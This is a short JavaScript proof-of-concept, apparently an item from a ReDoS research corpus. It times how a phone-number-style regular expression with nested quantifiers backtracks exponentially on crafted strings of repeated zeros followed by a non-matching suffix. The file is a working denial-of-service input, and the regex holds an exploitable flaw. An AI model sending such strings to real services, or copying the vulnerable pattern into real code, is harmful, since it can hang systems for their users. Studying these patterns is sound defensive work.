/* 277
 * (\+)?([-\._\(\) ]?[\d]{3,20}[-\._\(\) ]?){2,10}
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"000000"*8+"◎@! _1_NQ"
 */
var REGEX = /(\+)?([-\._\(\) ]?[\d]{3,20}[-\._\(\) ]?){2,10}/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '000000'.repeat(i*1) + '◎@! _1_NQ'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}